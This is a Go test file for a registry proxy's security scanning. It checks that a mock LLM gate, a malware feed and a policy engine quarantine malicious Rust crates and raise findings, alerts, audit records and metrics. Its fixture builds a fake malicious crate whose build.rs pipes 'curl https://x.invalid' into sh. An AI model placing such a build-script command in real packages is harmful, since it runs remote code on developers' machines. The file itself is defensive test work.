package main

import (
	"context"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/blechschmidt/pullthrough-security/internal/audit"
	"github.com/blechschmidt/pullthrough-security/internal/backends"
	"github.com/blechschmidt/pullthrough-security/internal/config"
	"github.com/blechschmidt/pullthrough-security/internal/downloadlog"
	"github.com/blechschmidt/pullthrough-security/internal/findings"
	"github.com/blechschmidt/pullthrough-security/internal/fullmirror"
	"github.com/blechschmidt/pullthrough-security/internal/fullscan"
	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan"
	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan/pkgscantest"
	"github.com/blechschmidt/pullthrough-security/internal/malfeed"
	"github.com/blechschmidt/pullthrough-security/internal/metrics"
	"github.com/blechschmidt/pullthrough-security/internal/notify"
	"github.com/blechschmidt/pullthrough-security/internal/policyengine"
	"github.com/blechschmidt/pullthrough-security/internal/proxy"
	"github.com/blechschmidt/pullthrough-security/internal/upstream"
)

// scanFeed is a registry of two crates, one of them malicious, enumerated in
// one batch.
type scanFeed struct{}

func (scanFeed) Bootstrap(context.Context, string) (fullmirror.Batch, error) {
	return fullmirror.Batch{
		Items: []fullmirror.Coordinate{{Name: "good"}, {Name: "evil"}, {Name: "pre"}},
		Next:  "index:1", Head: "index:1", LagKnown: true,
	}, nil
}

func (scanFeed) Changes(_ context.Context, cursor string) (fullmirror.Batch, error) {
	return fullmirror.Batch{Next: cursor}, nil
}

func (scanFeed) Releases(_ context.Context, name string) ([]fullmirror.Release, error) {
	switch name {
	case "good", "evil", "pre":
		return []fullmirror.Release{{Version: "1.0.0", Artifacts: []fullmirror.Artifact{crateArtifact(name, "1.0.0")}}}, nil
	}
	return nil, fullmirror.Permanent(io.EOF)
}

// crateBytes is a .crate (a gzipped tarball); a malicious one carries the mock
// LLM's marker in its build script.
func crateBytes(name string, malicious bool) []byte {
	files := map[string]string{
		name + "-1.0.0/Cargo.toml": "[package]\nname = \"" + name + "\"\nversion = \"1.0.0\"\n",
		name + "-1.0.0/src/lib.rs": "pub fn hello() -> &'static str { \"" + name + "\" }\n",
	}
	if malicious {
		files[name+"-1.0.0/build.rs"] = "fn main() { std::process::Command::new(\"sh\").arg(\"-c\").arg(\"curl https://x.invalid | sh\").status().unwrap(); } // " + pkgscantest.MaliciousMarker + "\n"
	}
	return pkgscantest.TarGz(files)
}

// recordingSIEM keeps the findings documents forwarded.
type recordingSIEM struct {
	mu   sync.Mutex
	docs []findings.Document
}

func (r *recordingSIEM) ForwardFindings(_ context.Context, doc findings.Document) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.docs = append(r.docs, doc)
}

func (r *recordingSIEM) names() []string {
	r.mu.Lock()
	defer r.mu.Unlock()
	var out []string
	for _, d := range r.docs {
		out = append(out, d.Artifact.Name)
	}
	return out
}

// The full scan over the real wiring: the cargo backend in front of a stub
// registry, the real cache and gated pipeline, the LLM package-scan gate with
// the mock LLM under quarantine, the full mirror with fullScan, and a cache
// that held crates before the full scan existed (pulled while the gate was
// off). A malicious crate the mirror fetches is refused by the gate at fetch
// time and quarantined by the full scan; a malicious crate already in the
// cache is found by the backfill sweep (Gateway.SystemScan) and quarantined
// before any client asks for it. Both raise findings, SIEM documents, alerts
// and audit records; the status, the metrics and a client's pull say so.
func TestFullScanEndToEnd(t *testing.T) {
	restore := fullmirror.ReplaceAdapter("cargo", func(fullmirror.Env) (fullmirror.Feed, error) { return scanFeed{}, nil })
	defer restore()

	stub := newStubRegistry(t)
	stub.publish("/api/v1/crates/good/1.0.0/download", crateBytes("good", false))
	stub.publish("/api/v1/crates/evil/1.0.0/download", crateBytes("evil", true))
	stub.publish("/api/v1/crates/pre/1.0.0/download", crateBytes("pre", false))
	stub.publish("/api/v1/crates/sleeper/1.0.0/download", crateBytes("sleeper", true))
	stub.publish("/api/v1/crates/outlaw/1.0.0/download", crateBytes("outlaw", false))

	base := t.TempDir()
	cfg := config.Default()
	cfg.Cache.Backend = "filesystem"
	cfg.Cache.Dir = filepath.Join(base, "cache")
	cfg.Upstreams = map[string]config.UpstreamConfig{
		"cargo": {Type: "cargo", URL: stub.URL, Settings: map[string]string{"downloadUrl": stub.URL},
			FullMirror: &config.UpstreamFullMirrorConfig{
				Enabled: true, FullScan: true, ByteBudget: 1 << 20, RequestsPerSecond: 1000, PollInterval: time.Hour,
			}},
	}
	cfg.FullMirror.Tenant = "mirror"
	cfg.LLMPackageScan.Enabled, cfg.LLMPackageScan.Provider, cfg.LLMPackageScan.APIKey = true, "claude", "x"
	cfg.FullScan.Budget.DailyUSD = 100
	if err := cfg.Validate(); err != nil {
		t.Fatalf("config: %v", err)
	}
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	cacheImpl, err := buildCache(&cfg, logger, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer cacheImpl.Close()
	registry := backends.NewRegistry()
	b, err := buildBackend(&cfg, "cargo", cfg.Upstreams["cargo"], upstream.NewWithHTTPClient(stub.Client(), "test/1"), upstream.Credentials{})
	if err != nil {
		t.Fatal(err)
	}
	if err := registry.Register(b); err != nil {
		t.Fatal(err)
	}

	// Before the full scan: clients pulled three crates while the gate was
	// off — one of them before the malware feed listed it.
	before, err := proxy.New(proxy.Dependencies{Logger: logger, Cache: cacheImpl, Backends: registry, Ecosystems: ecosystemMap(&cfg)}, proxy.Options{HTTPAddr: ":0"})
	if err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"pre", "sleeper", "outlaw"} {
		rr := httptest.NewRecorder()
		before.Handler().ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/v1/cargo/api/v1/crates/"+name+"/1.0.0/download", nil))
		if rr.Code != http.StatusOK {
			t.Fatalf("pulling %s before the full scan: %d", name, rr.Code)
		}
	}

	// The gate, with the mock LLM, quarantining what it judges malicious.
	model := &pkgscantest.Provider{}
	gate, err := llmpkgscan.NewService(llmpkgscan.Config{
		Enabled: true, Provider: model, Model: "mock-model", Action: llmpkgscan.ActionQuarantine, Logger: logger,
	})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = gate.Close() })
	sink := audit.NewMemorySink()
	auditLog, err := audit.NewLogger(context.Background(), audit.Options{Key: []byte("test-key"), Sink: sink})
	if err != nil {
		t.Fatal(err)
	}
	store := findings.NewStore(findings.StoreOptions{})
	siemRec := &recordingSIEM{}
	notes := &recordingNotifier{}

	fs, err := buildFullScan(&cfg, gate, auditLog, nil, logger)
	if err != nil || fs == nil {
		t.Fatalf("buildFullScan: %v %v", fs, err)
	}
	dl, err := downloadlog.New(downloadlog.Config{Enabled: true})
	if err != nil {
		t.Fatal(err)
	}
	mal := malfeed.NewService(malfeed.Config{
		InitialEntries: []malfeed.Entry{{ID: "MAL-2026-9", Ecosystem: "cargo", Name: "outlaw", AllVersions: true, Source: "test"}},
		InitialLoaded:  true,
	})
	gw, err := proxy.New(proxy.Dependencies{
		Logger: logger, Cache: cacheImpl, Backends: registry, Ecosystems: ecosystemMap(&cfg),
		LLMPkgScan: gate, Audit: auditLog, Findings: store, SIEM: siemRec, Notify: notes, Malfeed: mal, DownloadLog: dl,
		LLMScanObserver: newFullScanObserver(fs),
	}, proxy.Options{HTTPAddr: ":0"})
	if err != nil {
		t.Fatal(err)
	}
	e, err := buildFullMirror(&cfg, nil, nil, nil, auditLog, logger)
	if err != nil || e == nil {
		t.Fatalf("buildFullMirror: %v %v", e, err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	wireFullScan(ctx, fs, &cfg, gw, gate, fullScanInventory(cacheImpl), nil, nil)
	defer fs.Close()
	wireFullMirror(ctx, e, &cfg, gw, nil, nil, nil, fs)
	defer e.Close()

	waitFor(t, func() bool {
		us := e.Status().Upstreams[0]
		u, err := fs.UpstreamStatus("cargo")
		return err == nil && us.Phase == "follow" && u.Pending == 0 && u.Malicious == 2 && u.Benign == 3 && u.GateRefused == 1
	})

	// The mirror counted the malicious crate as refused by the gate.
	c := e.Status().Upstreams[0].Counters
	if c.Fetched != 1 || c.Refused != 1 || c.RefusedBy["llmpkgscan"] != 1 || c.Skipped[fullmirror.SkipCached] != 1 {
		t.Fatalf("mirror counters %+v", c)
	}
	u, _ := fs.UpstreamStatus("cargo")
	if u.Cached != 3 || u.Scanned != 3 || u.Quarantined != 2 || u.Counters.Evicted != 2 || u.Counters.Mirrored != 2 {
		t.Fatalf("full-scan status %+v counters %+v", u.Figures, u.Counters)
	}
	// The backfill read the three crates cached before the gate existed with a
	// model call each; the mirrored crates were judged at fetch time.
	if u.Counters.Scans != 3 || u.SpentUSD <= 0 || fs.Status().Budget.Daily.SpentUSD != u.SpentUSD {
		t.Fatalf("scans %d, spent %v (budget %+v)", u.Counters.Scans, u.SpentUSD, fs.Status().Budget.Daily)
	}
	// Every gate judged what the backfill found, in a gate pass: the crate
	// the malware feed lists now is refused by it, though the model found
	// nothing; the mirrored crate passed every gate at fetch time.
	if u.GatesPassed != 2 || u.GateRefused != 1 || u.Counters.GateRefusals["malfeed"] != 1 {
		t.Fatalf("gates: %d passed, %d refused (%v)", u.GatesPassed, u.GateRefused, u.Counters.GateRefusals)
	}
	if model.Calls() == 0 {
		t.Fatal("no model call")
	}
	// A gate pass is not a download: the download log has the mirror's
	// fetches and the clients' pulls, nothing of the full scan's.
	entries, err := dl.Query(downloadlog.Query{Limit: -1})
	if err != nil {
		t.Fatal(err)
	}
	for _, en := range entries.Entries {
		if en.Subject == fullscan.Subject {
			t.Errorf("the download log has a full-scan entry: %+v", en)
		}
	}

	// Neither malicious crate is in the cache, and a client's pull of one is
	// refused (the stored verdict: no model call).
	for path, want := range map[string]bool{
		"/api/v1/crates/good/1.0.0/download": true, "/api/v1/crates/pre/1.0.0/download": true,
		"/api/v1/crates/evil/1.0.0/download": false, "/api/v1/crates/sleeper/1.0.0/download": false,
	} {
		lk, err := gw.SystemLookup(context.Background(), proxy.SystemFetchRequest{Backend: "cargo", Path: path, Tenant: "mirror"})
		if err != nil || lk.Cached != want {
			t.Errorf("%s cached=%v, want %v (%v)", path, lk.Cached, want, err)
		}
	}
	calls := model.Calls()
	rr := httptest.NewRecorder()
	gw.Handler().ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/v1/cargo/api/v1/crates/sleeper/1.0.0/download", nil))
	if rr.Code != http.StatusForbidden || rr.Header().Get("X-Policy-Code") != llmpkgscan.PolicyCodeMalicious || model.Calls() != calls {
		t.Fatalf("a client's pull of the quarantined crate: %d %q (%d new model calls)", rr.Code, rr.Header().Get("X-Policy-Code"), model.Calls()-calls)
	}

	// Findings, SIEM documents and alerts for both malicious crates.
	for _, name := range []string{"evil", "sleeper"} {
		doc, ok := store.Get("", name)
		if !ok || len(doc.Findings) == 0 {
			t.Errorf("no findings recorded for %s", name)
		}
		if !strings.Contains(strings.Join(siemRec.names(), ","), name) {
			t.Errorf("no SIEM document for %s: %v", name, siemRec.names())
		}
	}
	alerts := notes.of(notify.EventLLMPackageScan)
	critical := map[string]bool{}
	for _, ev := range alerts {
		if ev.Severity == notify.SeverityCritical {
			critical[ev.Artifact] = true
		}
	}
	if !critical["evil@1.0.0"] || !critical["sleeper@1.0.0"] {
		t.Fatalf("alerts %+v", alerts)
	}
	// Audit: the gate's deferred reading of the mirror's fetch, and the full
	// scan's quarantine of both crates.
	var deferred, quarantined int
	for _, rec := range sink.Records() {
		ev := rec.Event
		if ev.Reason == "llmpkgscan:deferred:malicious" && ev.Detail["deferred"] == fullScanSource {
			deferred++
		}
		if ev.Reason == "llmpkgscan:malicious" && ev.Detail["source"] == fullScanSource && ev.Detail["evicted"] == true {
			quarantined++
		}
	}
	if deferred != 1 || quarantined != 2 {
		t.Fatalf("audit: %d deferred, %d quarantined by the full scan", deferred, quarantined)
	}

	// The metrics.
	reg := metrics.New()
	fullscan.BindMetrics(reg, fs)
	var sb strings.Builder
	if err := reg.WritePrometheus(&sb); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		`pullthrough_fullscan_artifacts{upstream="cargo",status="malicious"} 2`,
		`pullthrough_fullscan_artifacts{upstream="cargo",status="quarantined"} 2`,
		`pullthrough_fullscan_artifacts{upstream="cargo",status="benign"} 3`,
		`pullthrough_fullscan_artifacts{upstream="cargo",status="gate_refused"} 1`,
		`pullthrough_fullscan_enforced_total{upstream="cargo",outcome="evicted"} 2`,
		`pullthrough_fullscan_scans_total{upstream="cargo",result="model"} 3`,
	} {
		if !strings.Contains(sb.String(), want) {
			t.Errorf("metrics lack %s", want)
		}
	}

	// The state is part of the full mirror's backup source.
	for _, s := range backupMetadataSources(&cfg) {
		if s.name == "full-mirror" && !strings.HasPrefix(cfg.FullScanStateDir(), s.path) {
			t.Errorf("the full scan's state %s is outside the backup source %s", cfg.FullScanStateDir(), s.path)
		}
	}
}

// The full scan's scope: the upstreams that set fullScan, and with the
// global switch every upstream the gate covers; an upstream the gate does not
// cover cannot be fully scanned.
func TestFullScanScope(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	gate, err := llmpkgscan.NewService(llmpkgscan.Config{
		Enabled: true, Provider: &pkgscantest.Provider{}, Model: "m", Exclude: []string{"pip"}, MaxConcurrent: 3, Logger: logger,
	})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = gate.Close() })
	cfg := config.Default()
	cfg.Cache.Backend, cfg.Cache.Dir = "filesystem", t.TempDir()
	cfg.Upstreams = map[string]config.UpstreamConfig{
		"npm":   {Type: "npm", URL: "https://registry.npmjs.org"},
		"cargo": {Type: "cargo", URL: "https://crates.io"},
		"pypi":  {Type: "pip", URL: "https://pypi.org"},
	}
	cfg.FullScan.Budget.MonthlyUSD = 10
	if fs, err := buildFullScan(&cfg, gate, nil, nil, logger); err != nil || fs != nil {
		t.Fatalf("without a full scan: %v %v", fs, err)
	}
	cfg.FullScan.Enabled = true
	cfg.FullScan.Concurrency = 8
	fs, err := buildFullScan(&cfg, gate, nil, nil, logger)
	if err != nil {
		t.Fatal(err)
	}
	if !fs.InScope("npm") || !fs.InScope("cargo") || fs.InScope("pypi") {
		t.Fatalf("scope: npm %v cargo %v pypi %v", fs.InScope("npm"), fs.InScope("cargo"), fs.InScope("pypi"))
	}
	if st := fs.Status(); st.Concurrency != 2 || !st.All {
		t.Fatalf("concurrency %d (all %v): want one slot left to client pulls of the gate's 3", st.Concurrency, st.All)
	}
	cfg.FullScan.Enabled = false
	up := cfg.Upstreams["pypi"]
	up.FullMirror = &config.UpstreamFullMirrorConfig{FullScan: true}
	cfg.Upstreams["pypi"] = up
	if _, err := buildFullScan(&cfg, gate, nil, nil, logger); err == nil || !strings.Contains(err.Error(), "does not cover") {
		t.Fatalf("an upstream the gate does not cover: %v", err)
	}
	// A gate with one scan slot leaves none to client pulls.
	single, err := llmpkgscan.NewService(llmpkgscan.Config{Enabled: true, Provider: &pkgscantest.Provider{}, Model: "m", MaxConcurrent: 1, Logger: logger})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = single.Close() })
	up.FullMirror = nil
	cfg.Upstreams["pypi"] = up
	cfg.FullScan.Enabled = true
	if _, err := buildFullScan(&cfg, single, nil, nil, logger); err == nil || !strings.Contains(err.Error(), "maxConcurrent") {
		t.Fatalf("a gate with one slot: %v", err)
	}
}

// The full mirror's fetch defers the gate's refusal to the full scan; when a
// later gate refuses the file too (here the policy engine, which never saw the
// withheld reading), the full scan still applies the ladder: under quarantine
// the malicious crate leaves the cache and the alert is sent. The mirror
// counts the later gate's refusal.
func TestTheFullScanActsOnADeferredReadingALaterGateRefused(t *testing.T) {
	stub := newStubRegistry(t)
	stub.publish("/api/v1/crates/evil/1.0.0/download", crateBytes("evil", true))
	cfg := config.Default()
	cfg.Cache.Backend, cfg.Cache.Dir = "filesystem", filepath.Join(t.TempDir(), "cache")
	cfg.Upstreams = map[string]config.UpstreamConfig{
		"cargo": {Type: "cargo", URL: stub.URL, Settings: map[string]string{"downloadUrl": stub.URL},
			FullMirror: &config.UpstreamFullMirrorConfig{FullScan: true}},
	}
	cfg.LLMPackageScan.Enabled, cfg.LLMPackageScan.Provider, cfg.LLMPackageScan.APIKey = true, "claude", "x"
	cfg.FullScan.Budget.DailyUSD = 10
	if err := cfg.Validate(); err != nil {
		t.Fatal(err)
	}
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	cacheImpl, err := buildCache(&cfg, logger, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer cacheImpl.Close()
	registry := backends.NewRegistry()
	b, err := buildBackend(&cfg, "cargo", cfg.Upstreams["cargo"], upstream.NewWithHTTPClient(stub.Client(), "test/1"), upstream.Credentials{})
	if err != nil {
		t.Fatal(err)
	}
	if err := registry.Register(b); err != nil {
		t.Fatal(err)
	}
	gate, err := llmpkgscan.NewService(llmpkgscan.Config{Enabled: true, Provider: &pkgscantest.Provider{}, Model: "mock-model", Action: llmpkgscan.ActionQuarantine, Logger: logger})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = gate.Close() })
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "policy.yaml"), []byte("name: test\nrules:\n  - id: deny-evil\n    when: input.artifact.name == \"evil\"\n    action: deny\n    message: blocked by test policy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	pe, err := policyengine.New(policyengine.Config{Dir: dir, Mode: policyengine.ModeEnforce, Logger: logger})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = pe.Close() })
	notes := &recordingNotifier{}
	fs, err := buildFullScan(&cfg, gate, nil, nil, logger)
	if err != nil {
		t.Fatal(err)
	}
	gw, err := proxy.New(proxy.Dependencies{
		Logger: logger, Cache: cacheImpl, Backends: registry, Ecosystems: ecosystemMap(&cfg),
		LLMPkgScan: gate, Notify: notes, PolicyEngine: pe,
	}, proxy.Options{HTTPAddr: ":0"})
	if err != nil {
		t.Fatal(err)
	}
	f := gatewayMirrorFetcher{gw: gw, tenant: "mirror", scan: mirrorFullScan{fs: fs, gw: gw}}
	req := fullmirror.FetchRequest{Upstream: "cargo", Path: "/api/v1/crates/evil/1.0.0/download"}
	res, err := f.Fetch(context.Background(), req, io.Discard)
	if err != nil || res.Gate != "policyengine" || res.Admitted {
		t.Fatalf("the mirror's fetch: %+v %v", res, err)
	}
	if lk, err := gw.SystemLookup(context.Background(), proxy.SystemFetchRequest{Backend: "cargo", Path: req.Path, Tenant: "mirror"}); err != nil || lk.Cached {
		t.Fatalf("the malicious crate is still cached: %+v %v", lk, err)
	}
	var critical int
	for _, ev := range notes.of(notify.EventLLMPackageScan) {
		if ev.Severity == notify.SeverityCritical {
			critical++
		}
	}
	if critical != 1 {
		t.Fatalf("%d critical llm_package_scan alerts, want 1", critical)
	}
}
